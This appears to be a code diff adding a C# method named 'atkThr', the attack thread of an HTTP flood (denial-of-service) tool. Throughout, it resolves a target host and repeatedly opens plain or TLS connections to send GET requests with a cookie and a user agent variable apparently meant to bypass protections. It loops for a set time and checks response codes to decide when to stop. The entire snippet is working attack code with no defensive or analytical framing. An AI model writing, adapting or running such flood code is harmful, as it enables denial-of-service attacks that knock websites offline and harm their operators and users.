@@ -1,0 +1,109 @@
+private void atkThr(string target, int time, int tick, string cookie)
+        {
+            int port;
+            string request, code;
+            string target_bak = target;
+            if (target.Contains("https://"))
+            {
+                port = 443;
+                target = target.Remove(0, 8);
+            }
+            else if (target.Contains("http://"))
+            {
+                port = 80;
+                target = target.Remove(0, 7);
+            }
+            else
+            {
+                port = 80;
+            }
+            string targetIP;
+            try
+            {
+                IPHostEntry hostEntry;
+                hostEntry = Dns.GetHostEntry(target.Split('/')[0]);
+                targetIP = hostEntry.AddressList[r.Next(0, hostEntry.AddressList.Length)].ToString();
+            }
+            catch
+            {
+                targetIP = target.Split('/')[0];
+            }
+            request = "GET " + target_bak + " HTTP/1.1\r\nUser-Agent: " + vars.BypUA + "\r\nHost: " + target.Split('/')[0] + "\r\nCookie: " + cookie + "\r\n\r\n";
+            var buff = Encoding.ASCII.GetBytes(request);
+            if (port == 443)
+            {
+                Stopwatch s = new Stopwatch();
+                s.Start();
+                while (s.Elapsed < TimeSpan.FromSeconds(time) && atkava)
+                {
+                    try
+                    {
+                        var tc = new TcpClient();
+                        tc.SendTimeout = 5000;
+                        tc.Connect(targetIP, port);
+                        var sslStream = new SslStream(tc.GetStream());
+                        sslStream.AuthenticateAsClient(target.Split('/')[0], null, (SslProtocols)48 | (SslProtocols)192 | (SslProtocols)768 | (SslProtocols)3072, true);
+                        sslStream.Write(buff, 0, buff.Length);
+                        code = ReadMessage(sslStream).Substring(9, 3);
+                        Console.WriteLine(code);
+                        if (!code.Contains("200"))
+                        {
+                            if (!(code[0] == '5' && code[2] != '3'))
+                            {
+                                if (atkava == true)
+                                {
+                                    atkava = false;
+                                }
+                                sslStream.Close();
+                                tc.Close();
+                                s.Stop();
+                                break;
+                            }
+                        }
+                        sslStream.Close();
+                        tc.Close();
+                        Thread.Sleep(tick);
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine(ex);
+                    }
+                }
+                s.Stop();
+            }
+            else if (port == 80)
+            {
+                Stopwatch s = new Stopwatch();
+                s.Start();
+                while (s.Elapsed < TimeSpan.FromSeconds(time) && atkava)
+                {
+                    try
+                    {
+                        var tc = new TcpClient();
+                        tc.SendTimeout = 5000;
+                        tc.Connect(targetIP, port);
+                        NetworkStream stream = tc.GetStream();
+                        stream.Write(buff, 0, buff.Length);
+                        code = ReadMessage(stream).Substring(9, 3);
+                        if (!code.Contains("200"))
+                        {
+                            if (!(code[0] == '5' && code[2] != '3'))
+                            {
+                                stream.Close();
+                                tc.Close();
+                                s.Stop();
+                                break;
+                            }
+                        }
+                        stream.Close();
+                        tc.Close();
+                        Thread.Sleep(tick);
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine(ex);
+                    }
+                }
+                s.Stop();
+            }
+        }
